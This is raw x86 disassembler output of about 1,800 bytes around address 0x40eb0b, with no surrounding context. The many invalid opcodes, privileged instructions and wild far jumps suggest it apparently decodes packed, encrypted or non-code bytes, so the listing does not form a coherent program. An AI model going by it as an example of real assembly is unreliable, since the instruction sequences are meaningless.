  40eb0b:	test   al,0x15
  40eb0d:	mov    esp,esp
  40eb0f:	ror    BYTE PTR [eax],0x55
  40eb12:	jg     0x40ea9d
  40eb14:	repz arpl WORD PTR [edi],cx
  40eb17:	sbb    eax,0xb59ce0fe
  40eb1c:	xlat   BYTE PTR ds:[ebx]
  40eb1d:	mov    eax,0xdf125786
  40eb22:	jnp    0x40eb0b
  40eb24:	in     eax,0xec
  40eb26:	(bad)  
  40eb27:	loopne 0x40eb06
  40eb29:	js     0x40eb35
  40eb2b:	xchg   ecx,eax
  40eb2c:	jmp    0x40eb46
  40eb2e:	inc    edi
  40eb2f:	out    dx,al
  40eb30:	or     BYTE PTR [esi+0x6fd9b823],dh
  40eb36:	cmp    cl,al
  40eb38:	xor    al,0xc8
  40eb3a:	mov    ds:0xebf674e6,al
  40eb3f:	dec    esi
  40eb40:	leave  
  40eb41:	or     al,0xde
  40eb43:	cmc    
  40eb44:	xlat   BYTE PTR ds:[ebx]
  40eb45:	push   0xfffffff6
  40eb47:	js     0x40eafa
  40eb49:	add    al,BYTE PTR [esi+0x6a6054b]
  40eb4f:	cli    
  40eb50:	(bad)  
  40eb51:	dec    esi
  40eb52:	retf   
  40eb53:	xor    al,0x89
  40eb55:	lsl    edi,WORD PTR [ebx-0x7fc88006]
  40eb5c:	xor    BYTE PTR ds:0xa3830585,dh
  40eb62:	jns    0x40eb6b
  40eb64:	mov    eax,esi
  40eb66:	(bad)  
  40eb67:	adc    ecx,DWORD PTR [ebx+0x62]
  40eb6a:	fwait
  40eb6b:	shr    al,0xa8
  40eb6e:	adc    dl,BYTE PTR [ebx+0x66]
  40eb71:	mov    ah,0xbc
  40eb73:	sub    DWORD PTR [edi+0x50],0xffffff86
  40eb77:	jg     0x40eb5a
  40eb79:	leave  
  40eb7a:	call   0xb815:0x58706c23
  40eb81:	or     ch,ah
  40eb83:	xchg   ebp,eax
  40eb84:	daa    
  40eb85:	rcl    DWORD PTR [edi],0x1b
  40eb88:	bound  esi,QWORD PTR [esi]
  40eb8a:	fwait
  40eb8b:	lods   eax,DWORD PTR ds:[esi]
  40eb8c:	cmp    DWORD PTR es:[ebp+0x62a98a2e],0x36fe0e3a
  40eb97:	and    bh,BYTE PTR [edx+edi*4+0x6]
  40eb9b:	(bad)  
  40eb9c:	(bad)  
  40eb9d:	es mov esi,0x1d1df7c9
  40eba3:	inc    ebx
  40eba4:	adc    ch,ah
  40eba6:	sbb    dl,ch
  40eba8:	mov    dh,0xec
  40ebaa:	add    BYTE PTR ds:0xfa43111d,ch
  40ebb0:	add    ah,BYTE PTR [esi]
  40ebb2:	inc    ebp
  40ebb3:	push   0xb918f52d
  40ebb8:	dec    ebx
  40ebb9:	jg     0x40eb41
  40ebbb:	xchg   edx,eax
  40ebbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbe:	mov    BYTE PTR [ebp+0x55e274a9],bl
  40ebc4:	test   BYTE PTR [ebx-0x80],dh
  40ebc7:	jmp    0x7b1c18d3
  40ebcc:	or     eax,esp
  40ebce:	repz mov ds:0x68ef2150,al
  40ebd4:	push   esp
  40ebd5:	sbb    bh,ch
  40ebd7:	jmp    0x40eb78
  40ebd9:	pop    ds
  40ebda:	cld    
  40ebdb:	sub    dh,BYTE PTR [esi+0x7b2d4153]
  40ebe1:	(bad)  [ebp-0x5cffed68]
  40ebe7:	stc    
  40ebe8:	jo     0x40ebe2
  40ebea:	sbb    BYTE PTR [ebp-0x4a],0xdf
  40ebee:	mov    ebp,0xd6f01028
  40ebf3:	xchg   edi,eax
  40ebf4:	pop    es
  40ebf5:	and    esp,0xffffffc9
  40ebf8:	fstp   st(2)
  40ebfa:	ret    0x7174
  40ebfd:	mov    dl,0x86
  40ebff:	dec    ecx
  40ec00:	xor    BYTE PTR [ebx],cl
  40ec02:	sub    edi,eax
  40ec04:	and    al,dh
  40ec06:	jmp    0x97a4:0x297f92c8
  40ec0d:	ret    0x3d14
  40ec10:	mov    ch,0x83
  40ec12:	xchg   BYTE PTR [ebx],dl
  40ec14:	mov    al,0x60
  40ec16:	iret   
  40ec17:	or     edi,esp
  40ec19:	pop    ecx
  40ec1a:	cmp    eax,0xcfd24929
  40ec1f:	mov    ah,0x8
  40ec21:	jbe    0x40eba4
  40ec23:	cwde   
  40ec24:	loop   0x40ec33
  40ec26:	mov    bh,0xe1
  40ec28:	jo     0x40ec29
  40ec2a:	mov    si,0x36a1
  40ec2e:	xlat   BYTE PTR ds:[ebx]
  40ec2f:	stc    
  40ec30:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ec32:	jne    0x40ebdc
  40ec34:	test   DWORD PTR [ebp+0xefd7346],0xf025f140
  40ec3e:	jl     0x40ec24
  40ec40:	or     al,0xdb
  40ec42:	sbb    al,BYTE PTR [bx+si+0x62]
  40ec46:	fcom   DWORD PTR [ebx]
  40ec48:	es out dx,eax
  40ec4a:	test   DWORD PTR [edi+0x1ffe7046],ecx
  40ec50:	pushf  
  40ec51:	icebp  
  40ec52:	test   BYTE PTR ss:[esi],dh
  40ec55:	cmp    BYTE PTR [edx+0x77721c5],ch
  40ec5b:	ss add al,0xe
  40ec5e:	xchg   BYTE PTR [ecx+0x30aad52c],bl
  40ec64:	pop    ebp
  40ec65:	packuswb mm6,QWORD PTR [eax-0x9]
  40ec69:	jmp    0x40ec4a
  40ec6b:	pop    edx
  40ec6c:	xchg   DWORD PTR [eax],eax
  40ec6e:	jae    0x40ecd4
  40ec70:	or     edi,DWORD PTR [edx]
  40ec72:	adc    BYTE PTR [edi],bl
  40ec74:	and    dl,ch
  40ec76:	mov    ecx,0xd1a90f7d
  40ec7b:	call   0x8960a046
  40ec80:	inc    ecx
  40ec81:	and    al,0x54
  40ec83:	das    
  40ec84:	lods   eax,DWORD PTR ds:[esi]
  40ec85:	dec    edi
  40ec86:	jo     0x40ec5d
  40ec88:	sbb    al,bh
  40ec8a:	jbe    0x40ec78
  40ec8c:	aaa    
  40ec8d:	ja     0x1757a6d2
  40ec93:	mov    ch,0x55
  40ec95:	jno    0x40ecd4
  40ec97:	pop    eax
  40ec98:	jb     0x40ecb6
  40ec9a:	xchg   al,dl
  40ec9c:	popa   
  40ec9d:	fistp  WORD PTR [ecx]
  40ec9f:	ror    BYTE PTR [eax],1
  40eca1:	mov    BYTE PTR [esi-0x5b0513f8],dh
  40eca7:	icebp  
  40eca8:	je     0x40ec9b
  40ecaa:	fadd   st(2),st
  40ecac:	cmp    DWORD PTR [eax+0x7de1d281],0xfd016e53
  40ecb6:	xchg   BYTE PTR [ecx+0x51a7af0],dh
  40ecbc:	mov    eax,ds:0x562e2b84
  40ecc1:	pop    eax
  40ecc2:	xor    BYTE PTR [edx+0x1c],bh
  40ecc5:	mov    ebx,0xd19532f6
  40ecca:	xchg   BYTE PTR [ebp+0x20],al
  40eccd:	les    ebx,FWORD PTR [eax-0x5d]
  40ecd0:	icebp  
  40ecd1:	xchg   BYTE PTR [ecx+ebp*1-0x4a69b67f],ah
  40ecd8:	or     BYTE PTR [edx],dl
  40ecda:	pop    es
  40ecdb:	ret    
  40ecdc:	adc    eax,0x9d31cf57
  40ece1:	icebp  
  40ece2:	jle    0x40ec79
  40ece4:	test   al,0xc3
  40ece6:	jmp    0x6021:0xd53fd335
  40eced:	lock (bad) 
  40ecef:	out    dx,eax
  40ecf0:	cld    
  40ecf1:	pop    edx
  40ecf2:	mov    edi,0xacf1d9af
  40ecf7:	xor    DWORD PTR [eax],ebp
  40ecf9:	in     al,0xc3
  40ecfb:	sub    al,0x3f
  40ecfd:	jge    0x40eca8
  40ecff:	sbb    DWORD PTR ds:0x736586eb,ebx
  40ed05:	ds aam 0xac
  40ed08:	sub    eax,0xd5281552
  40ed0d:	cmp    ah,BYTE PTR [eax]
  40ed0f:	js     0x40ed19
  40ed11:	data16 mov cl,0x18
  40ed14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed15:	sub    eax,0xf1b330bb
  40ed1a:	test   al,0xe7
  40ed1c:	pop    edi
  40ed1d:	and    BYTE PTR [ebp-0x5849d4b1],bh
  40ed23:	loop   0x40ed67
  40ed25:	lods   al,BYTE PTR ds:[esi]
  40ed26:	xchg   cl,cl
  40ed28:	arpl   WORD PTR ds:0x9bbd6a06,sp
  40ed2e:	cwde   
  40ed2f:	sub    BYTE PTR [ebx-0x53],ch
  40ed32:	push   ebx
  40ed33:	and    al,0x14
  40ed35:	mov    esi,0xb04162f9
  40ed3a:	into   
  40ed3b:	sbb    DWORD PTR [ebp+0x2d],edx
  40ed3e:	ror    DWORD PTR ds:0x29b80b0b,0xb2
  40ed45:	push   esp
  40ed46:	push   eax
  40ed47:	scas   eax,DWORD PTR es:[edi]
  40ed48:	ror    DWORD PTR [edi],0x44
  40ed4b:	(bad)  
  40ed4c:	xor    al,0xf0
  40ed4e:	cdq    
  40ed4f:	jns    0x40ed42
  40ed51:	adc    eax,0xf1aba832
  40ed56:	cs mov bl,0x2a
  40ed59:	pop    esi
  40ed5a:	lahf   
  40ed5b:	push   es
  40ed5c:	mov    eax,0x173f10e2
  40ed61:	repnz icebp 
  40ed63:	fucomip st,st(5)
  40ed65:	loopne 0x40ed90
  40ed67:	jmp    0x2a2264f4
  40ed6c:	xchg   DWORD PTR [edx-0x22],ecx
  40ed6f:	cmp    cl,BYTE PTR [esi]
  40ed71:	xchg   ebp,eax
  40ed72:	or     eax,0xbf2b9883
  40ed77:	scas   al,BYTE PTR es:[edi]
  40ed78:	or     BYTE PTR [esi-0x61],al
  40ed7b:	dec    esp
  40ed7c:	jmp    0x40ecfe
  40ed7e:	and    DWORD PTR [eax],esp
  40ed80:	mov    ebp,0x10d7d2f0
  40ed85:	cld    
  40ed86:	pop    ds
  40ed87:	into   
  40ed88:	xor    eax,0x8cb4e92d
  40ed8d:	jbe    0x40ed15
  40ed8f:	sub    DWORD PTR [ebp+0x11f6126a],edx
  40ed95:	jb     0x40ed49
  40ed97:	sub    al,ah
  40ed99:	lods   eax,DWORD PTR ds:[esi]
  40ed9a:	cmp    cl,cl
  40ed9c:	je     0x40edde
  40ed9e:	int3   
  40ed9f:	adc    eax,0x28ddac02
  40eda4:	imul   eax,ecx,0xfd973a15
  40edaa:	xor    al,0x29
  40edac:	jnp    0x40edc4
  40edae:	arpl   sp,di
  40edb0:	div    DWORD PTR [ebx+0x5dd40a0]
  40edb6:	repnz or esp,ebp
  40edb9:	into   
  40edba:	jbe    0x40edc2
  40edbc:	lea    esi,[eax-0x66]
  40edbf:	loop   0x40edd3
  40edc1:	adc    eax,0xd21a5749
  40edc6:	pop    ecx
  40edc7:	pusha  
  40edc8:	iret   
  40edc9:	icebp  
  40edca:	mov    dh,0x48
  40edcc:	push   ebx
  40edcd:	inc    edi
  40edce:	sbb    al,0xaa
  40edd0:	lea    esp,[edx-0x3a]
  40edd3:	sub    DWORD PTR [edi+0x87a213d],edi
  40edd9:	shl    cl,cl
  40eddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eddc:	fldpi  
  40edde:	cmp    eax,0x88f0b5f0
  40ede3:	jae    0x40ee2f
  40ede5:	add    BYTE PTR [edx+0x10],ah
  40ede8:	loopne 0x40edcb
  40edea:	sbb    DWORD PTR [ecx+edi*8],0xaa9984bb
  40edf1:	lea    edi,[edx]
  40edf3:	std    
  40edf4:	enter  0x1c2c,0x8
  40edf8:	gs int 0x67
  40edfb:	sub    DWORD PTR [ebx+ebx*1+0x72],ebp
  40edff:	jmp    0x6833aa43
  40ee04:	mov    BYTE PTR [esi],dh
  40ee06:	shr    BYTE PTR [eax-0x33215f3a],cl
  40ee0c:	iret   
  40ee0d:	fidiv  WORD PTR [eax+ebp*1+0x49]
  40ee11:	outs   dx,BYTE PTR ds:[esi]
  40ee12:	pop    ebp
  40ee13:	jb     0x40ee1d
  40ee15:	bound  esi,QWORD PTR [esi]
  40ee17:	sbb    eax,0xf950ce68
  40ee1c:	adc    dh,al
  40ee1e:	cmp    ch,BYTE PTR [edi-0x308d4842]
  40ee24:	sahf   
  40ee25:	sbb    al,0x48
  40ee27:	hlt    
  40ee28:	lahf   
  40ee29:	jmp    0x40edc0
  40ee2b:	inc    ebx
  40ee2c:	push   0xffffff84
  40ee2e:	mov    ds:0x87210d23,al
  40ee33:	fmul   DWORD PTR [edi-0x5d]
  40ee36:	fsubr  DWORD PTR [eax]
  40ee38:	pop    es
  40ee39:	pop    eax
  40ee3a:	sbb    eax,0x7d4834c9
  40ee3f:	je     0x40ee80
  40ee41:	adc    ebp,DWORD PTR [ecx]
  40ee43:	dec    ebp
  40ee44:	jge    0x40ede3
  40ee46:	pop    es
  40ee47:	outs   dx,BYTE PTR ds:[esi]
  40ee48:	pop    ebp
  40ee49:	lock xchg esp,eax
  40ee4b:	(bad)  
  40ee4c:	mov    eax,esi
  40ee4e:	js     0x40ee41
  40ee50:	nop
  40ee51:	sub    bl,ch
  40ee53:	les    ecx,FWORD PTR [edx+0x2a6336f1]
  40ee59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee5a:	xchg   ebp,eax
  40ee5b:	dec    DWORD PTR [esp+ecx*1]
  40ee5e:	in     eax,0xbd
  40ee60:	in     eax,0xcd
  40ee62:	(bad)  
  40ee63:	sub    DWORD PTR [eax+edi*8],eax
  40ee66:	fdivr  QWORD PTR [ecx]
  40ee68:	sbb    eax,0x7e34927c
  40ee6d:	jmp    ebx
  40ee6f:	dec    esi
  40ee70:	dec    eax
  40ee71:	cdq    
  40ee72:	mov    cl,0x27
  40ee74:	cmp    ax,0x80f
  40ee78:	mov    ebp,0xb328bf0d
  40ee7d:	loop   0x40ee86
  40ee7f:	sbb    DWORD PTR [ebx],0x1bdb1458
  40ee85:	icebp  
  40ee86:	pop    esp
  40ee87:	jp     0x40eeef
  40ee89:	adc    DWORD PTR [ecx-0x28],edx
  40ee8c:	iret   
  40ee8d:	loopne 0x40eed0
  40ee8f:	sub    DWORD PTR [ebx+0x8aa0fd1],edx
  40ee95:	xchg   esp,eax
  40ee96:	frstor [edi+0x6ae07cd]
  40ee9c:	jnp    0x40ee8f
  40ee9e:	mov    ah,0xd8
  40eea0:	jno    0x40eee3
  40eea2:	or     eax,0x8f24f3c3
  40eea7:	nop
  40eea8:	adc    al,0xc0
  40eeaa:	cdq    
  40eeab:	mov    cl,0x95
  40eead:	aas    
  40eeae:	call   0xc69c0d99
  40eeb3:	pop    esp
  40eeb4:	xor    eax,0x372843e4
  40eeb9:	pop    ds
  40eeba:	dec    ecx
  40eebb:	push   0x8
  40eebd:	cmp    al,0x74
  40eebf:	xlat   BYTE PTR ds:[ebx]
  40eec0:	cs sbb al,0x37
  40eec3:	pop    eax
  40eec4:	xor    bh,0xd8
  40eec7:	jo     0x40eeb1
  40eec9:	mov    ch,0x88
  40eecb:	scas   eax,DWORD PTR es:[edi]
  40eecc:	cwde   
  40eecd:	(bad)  
  40eece:	cmp    DWORD PTR [ecx],eax
  40eed0:	or     BYTE PTR [esi],bh
  40eed2:	in     al,dx
  40eed3:	sbb    edx,ebp
  40eed5:	xor    al,0x5c
  40eed7:	xchg   esp,eax
  40eed8:	cwde   
  40eed9:	cli    
  40eeda:	xchg   esp,eax
  40eedb:	cmp    eax,0x4e4c7cbc
  40eee0:	mov    eax,ds:0xf82e71d9
  40eee5:	sbb    esi,DWORD PTR [ebp-0x77]
  40eee8:	or     BYTE PTR [esi-0x5bf12d00],dh
  40eeee:	mov    eax,0xa781a0be
  40eef3:	push   ecx
  40eef4:	mov    ecx,0x1228243a
  40eef9:	lea    edi,[edx+0x5a280610]
  40eeff:	sbb    BYTE PTR [edi+0x20],bh
  40ef02:	jmp    0xcc83:0x47b35c0f
  40ef09:	out    0xa2,eax
  40ef0b:	(bad)  
  40ef0c:	adc    BYTE PTR [edx+0x66db8904],bl
  40ef12:	xchg   BYTE PTR [eax+ecx*1+0x8],ah
  40ef16:	inc    eax
  40ef17:	daa    
  40ef18:	cmp    BYTE PTR [edi],ah
  40ef1a:	mov    ah,0x37
  40ef1c:	or     al,0xf1
  40ef1e:	mov    eax,0x5f9625de
  40ef23:	xor    al,0x46
  40ef25:	test   BYTE PTR [ecx-0x6550435a],al
  40ef2b:	popf   
  40ef2c:	pop    es
  40ef2d:	mov    edx,DWORD PTR ds:0x84f036a9
  40ef33:	stc    
  40ef34:	mov    ds:0xf16e1777,eax
  40ef39:	mov    ch,0x39
  40ef3b:	test   al,0xf7
  40ef3d:	retf   
  40ef3e:	push   ebx
  40ef3f:	jle    0x40ef34
  40ef41:	ss int 0xaa
  40ef44:	cli    
  40ef45:	icebp  
  40ef46:	mov    ah,0xe8
  40ef48:	(bad)  
  40ef49:	push   esi
  40ef4a:	out    dx,al
  40ef4b:	push   ebx
  40ef4c:	add    dh,BYTE PTR ds:0x758ed06f
  40ef52:	xchg   BYTE PTR [ecx],ah
  40ef54:	test   al,0xcd
  40ef56:	jnp    0x40eef7
  40ef58:	in     eax,0xcf
  40ef5a:	xchg   DWORD PTR [eax+0x3f],edx
  40ef5d:	sub    al,BYTE PTR [esi+0x7c82c776]
  40ef63:	xchg   ebp,eax
  40ef64:	pop    esp
  40ef65:	jge    0x40eef0
  40ef67:	pop    ds
  40ef68:	mov    ds:0x28bdc38d,al
  40ef6d:	icebp  
  40ef6e:	xchg   DWORD PTR [ebp+esi*1-0x3ad6c67c],ebx
  40ef75:	adc    ah,BYTE PTR [eax-0x10]
  40ef78:	or     eax,ebp
  40ef7a:	call   0x5cc2:0x483799c7
  40ef81:	lock add al,0x31
  40ef84:	(bad)  
  40ef86:	jl     0x40ef81
  40ef88:	bound  ebp,QWORD PTR [edi+0x64a77886]
  40ef8e:	xchg   ebx,ebp
  40ef90:	push   0x1f40d1c1
  40ef95:	in     eax,dx
  40ef96:	add    DWORD PTR [eax],ebp
  40ef98:	sbb    ch,BYTE PTR [edi]
  40ef9a:	jnp    0x40effb
  40ef9c:	or     al,dl
  40ef9e:	adc    dl,0xef
  40efa1:	mov    DWORD PTR [ebx],eax
  40efa3:	(bad)  
  40efa4:	pop    edi
  40efa5:	or     edi,DWORD PTR [edx-0x3c8d90f2]
  40efab:	cmp    esi,edi
  40efad:	test   DWORD PTR [ecx-0x2805508f],edi
  40efb3:	clc    
  40efb4:	push   0xfffffff1
  40efb6:	std    
  40efb7:	lahf   
  40efb8:	pushf  
  40efb9:	dec    ebx
  40efba:	call   0xdb3a0568
  40efbf:	repnz xor BYTE PTR [eax],cl
  40efc2:	pop    ecx
  40efc3:	retf   
  40efc4:	lock movd mm5,DWORD PTR [eax]
  40efc8:	std    
  40efc9:	mov    eax,0x3a3d3877
  40efce:	xchg   BYTE PTR [ebx+0x7c282ca8],bh
  40efd4:	jmp    DWORD PTR [edi]
  40efd6:	(bad)  
  40efd7:	sub    BYTE PTR [esi+0x76bef444],ah
  40efdd:	mov    esp,0xfb1f7f93
  40efe2:	std    
  40efe3:	sub    DWORD PTR [edi+0x5b],esp
  40efe6:	int3   
  40efe7:	int3   
  40efe8:	jo     0x40efdb
  40efea:	test   al,0xcb
  40efec:	repnz sbb al,0xd1
  40efef:	popf   
  40eff0:	scas   al,BYTE PTR es:[edi]
  40eff1:	(bad)  
  40eff2:	retf   0xa1c2
  40eff5:	inc    edi
  40eff6:	lea    edx,[edi]
  40eff8:	mul    DWORD PTR [ecx+eax*4+0x6f]
  40effc:	cmp    bh,bh
  40effe:	mov    BYTE PTR [esi],al
  40f000:	mov    cl,0x33
  40f002:	lock or al,BYTE PTR ds:0x8e89fb8
  40f009:	jp     0x40ef9c
  40f00b:	jp     0x40f086
  40f00d:	cdq    
  40f00e:	scas   al,BYTE PTR es:[edi]
  40f00f:	repnz test al,dh
  40f012:	les    ebp,FWORD PTR [esi]
  40f014:	mov    ss,WORD PTR [ecx+esi*4+0x1d]
  40f018:	xchg   DWORD PTR [eax+0x45],eax
  40f01b:	test   BYTE PTR [edx+0x26],ch
  40f01e:	xchg   DWORD PTR [ecx+0x45],esi
  40f021:	retf   
  40f022:	jmp    0x252fb1d0
  40f027:	adc    al,0xf6
  40f029:	lods   al,BYTE PTR ds:[esi]
  40f02a:	loopne 0x40f054
  40f02c:	dec    ebx
  40f02d:	mov    dh,0x28
  40f02f:	jp     0x40efd9
  40f031:	sbb    eax,0xba8b0d84
  40f036:	xchg   BYTE PTR [ebx+edx*8-0xf],ah
  40f03a:	inc    esi
  40f03b:	pop    ebx
  40f03c:	cmp    DWORD PTR [ebx+0x6437579b],edx
  40f042:	xchg   edi,eax
  40f043:	pop    ecx
  40f044:	jmp    0xf6ee68c5
  40f049:	cmc    
  40f04a:	add    ebp,0x9cb9b09d
  40f050:	and    al,0xf0
  40f052:	cs inc esi
  40f054:	inc    edi
  40f055:	mov    eax,ds:0x56eeb5c5
  40f05a:	repnz inc edx
  40f05c:	xchg   DWORD PTR [edx],ebp
  40f05e:	xchg   bh,bh
  40f060:	push   es
  40f061:	je     0x40f0a1
  40f063:	pop    esi
  40f064:	push   ebp
  40f065:	sti    
  40f066:	jb     0x40f090
  40f068:	mov    ds:0x87aa96f,al
  40f06d:	adc    BYTE PTR [esi+0x434b1105],dh
  40f073:	cs aas 
  40f075:	lock xor dl,ah
  40f078:	mul    BYTE PTR [eax-0xcc76b88]
  40f07e:	gs and eax,0x4990f73f
  40f084:	jmp    0x832d:0x752ee9ba
  40f08b:	mov    ecx,0x2899c5ef
  40f090:	nop
  40f091:	into   
  40f092:	sub    bl,BYTE PTR [eax+ecx*1-0x7bcc0a0a]
  40f099:	mov    bh,0xee
  40f09b:	(bad)  
  40f09c:	pop    es
  40f09d:	lock pop esp
  40f09f:	or     al,BYTE PTR [ebp+0x2b264880]
  40f0a5:	dec    ecx
  40f0a6:	mov    ds:0x8179a737,al
  40f0ab:	fistp  QWORD PTR [esi+0x565577d0]
  40f0b1:	popa   
  40f0b2:	xor    BYTE PTR [ebp+ecx*1+0x2],al
  40f0b6:	mov    DWORD PTR [ecx+0x45],esp
  40f0b9:	pop    esp
  40f0ba:	or     al,BYTE PTR [ecx-0x7379c128]
  40f0c0:	ins    BYTE PTR es:[edi],dx
  40f0c1:	stos   DWORD PTR es:[edi],eax
  40f0c2:	xchg   ch,cl
  40f0c4:	imul   ecx,edx,0xeb791d05
  40f0ca:	fld    TBYTE PTR [eax]
  40f0cc:	outs   dx,DWORD PTR ds:[esi]
  40f0cd:	pop    ecx
  40f0ce:	mov    eax,gs
  40f0d0:	neg    DWORD PTR [ebp-0x2d4a99a9]
  40f0d6:	push   edi
  40f0d8:	push   edx
  40f0d9:	lock mov al,ds:0xeca6443d
  40f0df:	xchg   edx,eax
  40f0e0:	ss (bad) 
  40f0e2:	fwait
  40f0e3:	hlt    
  40f0e4:	leave  
  40f0e5:	xchg   BYTE PTR ds:[edi-0x35],cl
  40f0e9:	icebp  
  40f0ea:	imul   eax,ebx,0xfffffff1
  40f0ed:	icebp  
  40f0ee:	pop    esp
  40f0ef:	aam    0xe
  40f0f1:	call   0x5b1644bd
  40f0f6:	sub    dh,BYTE PTR [ecx-0x76]
  40f0f9:	xor    al,0x9b
  40f0fb:	out    0x7a,eax
  40f0fd:	out    0x1,eax
  40f0ff:	sub    DWORD PTR [edi+ecx*8-0x56],eax
  40f103:	xchg   esi,eax
  40f104:	cdq    
  40f105:	lock dec eax
  40f107:	push   ds
  40f108:	lods   al,BYTE PTR ds:[esi]
  40f109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10a:	pop    edx
  40f10b:	sbb    cl,BYTE PTR [ecx]
  40f10d:	repnz scas eax,DWORD PTR es:[edi]
  40f10f:	cld    
  40f110:	fst    DWORD PTR [ecx+eiz*4]
  40f113:	popf   
  40f114:	mov    bh,0xe
  40f116:	xor    DWORD PTR [edi+0x7a06f135],ebp
  40f11c:	adc    bh,BYTE PTR [eax-0x314d5f78]
  40f122:	clc    
  40f123:	sub    DWORD PTR [edx-0x7d],eax
  40f126:	test   al,0xbf
  40f128:	sub    BYTE PTR [esi-0x7a],0x49
  40f12c:	mov    eax,0xf2772d2c
  40f131:	icebp  
  40f132:	lock int 0xa6
  40f135:	cmc    
  40f136:	in     eax,dx
  40f137:	in     eax,dx
  40f138:	and    edx,DWORD PTR [esi+ebp*4-0x7b2a2ca0]
  40f13f:	and    ebx,0xf
  40f142:	cmc    
  40f143:	inc    eax
  40f144:	jl     0x40f136
  40f146:	es in  al,0xd9
  40f149:	std    
  40f14a:	adc    eax,0x46ebd4bf
  40f14f:	retf   0x7cac
  40f152:	stos   BYTE PTR es:[edi],al
  40f153:	aaa    
  40f154:	imul   esp,DWORD PTR [eax-0x406d7a7c],0xf187ccef
  40f15e:	outs   dx,WORD PTR ds:[esi]
  40f160:	mov    ecx,ebx
  40f162:	fstp   TBYTE PTR [edx]
  40f164:	xchg   esi,eax
  40f165:	mov    ecx,DWORD PTR [ecx-0x792ee2f7]
  40f16b:	popa   
  40f16c:	addr16 pop ecx
  40f16e:	mov    dl,0xf8
  40f170:	dec    ebp
  40f171:	pop    eax
  40f172:	lahf   
  40f173:	adc    BYTE PTR [ecx-0x47d1a2c2],bl
  40f179:	dec    ebp
  40f17a:	xlat   BYTE PTR ds:[ebx]
  40f17b:	xchg   bh,dh
  40f17d:	icebp  
  40f17e:	or     al,0x6c
  40f180:	(bad)  
  40f181:	in     al,dx
  40f182:	imul   BYTE PTR [ecx-0x413b0e4f]
  40f188:	adc    al,0x93
  40f18a:	or     ecx,edi
  40f18c:	(bad)  
  40f18d:	test   eax,0x8ff6dda9
  40f192:	mov    ecx,0x66049f5
  40f197:	jno    0x40f1c2
  40f199:	inc    DWORD PTR [edi+esi*4+0x19]
  40f19d:	mov    al,ds:0x5461029
  40f1a2:	or     ebp,edx
  40f1a4:	and    al,0xcd
  40f1a6:	jge    0x40f211
  40f1a8:	imul   ecx
  40f1aa:	dec    ecx
  40f1ab:	sub    ebx,DWORD PTR [eax-0x40]
  40f1ae:	out    dx,al
  40f1af:	lea    esp,ds:0x7a4eeef1
  40f1b5:	adc    eax,0xda7dde9e
  40f1ba:	adc    DWORD PTR [esi+ecx*8],edx
  40f1bd:	xchg   dh,cl
  40f1bf:	inc    ebx
  40f1c0:	sti    
  40f1c1:	push   es
  40f1c2:	xchg   edi,esp
  40f1c4:	xor    esi,ecx
  40f1c6:	jmp    0xe481:0x8e15c040
  40f1cd:	ret    
  40f1ce:	je     0x40f1fe
  40f1d0:	mov    dl,0x38
  40f1d2:	cwde   
  40f1d3:	popa   
  40f1d4:	jmp    0x26ee:0xf6e985a6
  40f1db:	repz dec ecx
  40f1dd:	daa    
  40f1de:	pop    es
  40f1df:	gs push es
  40f1e1:	dec    ecx
  40f1e2:	inc    esi
  40f1e3:	push   eax
  40f1e4:	or     BYTE PTR [eax],dl
  40f1e6:	dec    esp
  40f1e7:	pop    esi
  40f1e8:	adc    DWORD PTR [ebx],edi
  40f1ea:	ss pop es
  40f1ec:	scas   al,BYTE PTR es:[edi]
  40f1ed:	imul   ecx,DWORD PTR [esi+0x1c77f78b],0x880c3a6a
  40f1f7:	popf   
  40f1f8:	xor    al,0xd8
  40f1fa:	neg    bl
  40f1fc:	or     cl,al
  40f1fe:	pop    ebp
  40f1ff:	jmp    0x40f1fd
  40f201:	test   BYTE PTR [ecx+ecx*2],ah
  40f204:	rcl    DWORD PTR [ebx],cl
  40f206:	push   ecx
  40f207:	sub    BYTE PTR [edi],cl
  40f209:	pop    edx
  40f20a:	mov    cl,0xa9
  40f20c:	or     BYTE PTR [esi+0x35],al
  40f20f:	loope  0x40f23b
  40f211:	jl     0x40f214
  40f213:	pop    ecx
  40f214:	sub    bl,dh
  40f216:	cmp    BYTE PTR [edx],bh
  40f218:	pop    edi
  40f219:	in     al,0x1
  40f21b:	jmp    0x99f7:0x9f2f5018
  40f222:	aas    
  40f223:	pop    ss
  40f224:	lods   eax,DWORD PTR ds:[esi]
  40f225:	(bad)  
  40f227:	in     al,0xd4
  40f229:	icebp  
  40f22a:	push   ss
  40f22b:	rcl    DWORD PTR [ebx],1
  40f22d:	pop    eax
  40f22e:	imul   BYTE PTR [esi]
  40f230:	mov    edi,0x31ac6a31
  40f235:	cmp    eax,DWORD PTR [eax-0x40bfe76d]
  40f23b:	fst    DWORD PTR [esi-0x3011eb02]
  40f241:	inc    ecx
  40f242:	push   ebp
  40f243:	jp     0x40f270
  40f245:	adc    eax,0xac14e856
  40f24a:	mov    eax,ds:0x6c70b2df
  40f24f:	cmp    DWORD PTR [esi],0xffffffd6
  40f252:	pop    ebx
  40f253:	jmp    0xcd31e425
  40f258:	ss jne 0x40f277
  40f25b:	pushf  
  40f25c:	mov    ebx,0xf4ca6330
  40f261:	inc    eax
  40f262:	adc    BYTE PTR [ecx-0x76],0x70
  40f266:	ret    
  40f267:	sub    DWORD PTR [ecx],eax
  40f269:	lock mov esi,0x96c3cac8
  40f26f:	repz cmp edi,ebx
  40f272:	sbb    DWORD PTR [ecx+0x4b87e262],0x58
  40f279:	lods   al,BYTE PTR ds:[esi]
  40f27a:	cmp    dh,BYTE PTR [ebx]
  40f27c:	xchg   edi,eax
  40f27d:	lock pushf 
  40f27f:	loope  0x40f2b4
  40f281:	jle    0x40f234
  40f283:	mov    ebx,0xe78d9aae
  40f288:	clc    
  40f289:	aaa    
  40f28a:	xchg   BYTE PTR [edi+0x47],bl
  40f28d:	sub    DWORD PTR [eax-0x1f],0x67
  40f291:	xor    eax,0xd8352b5b
  40f296:	sar    eax,cl
  40f298:	cwde   
  40f299:	jg     0x40f28e
  40f29b:	test   al,0xa
  40f29d:	push   ss
  40f29e:	xchg   ebx,eax
  40f29f:	lds    ebx,FWORD PTR [esi-0x5fb397d9]
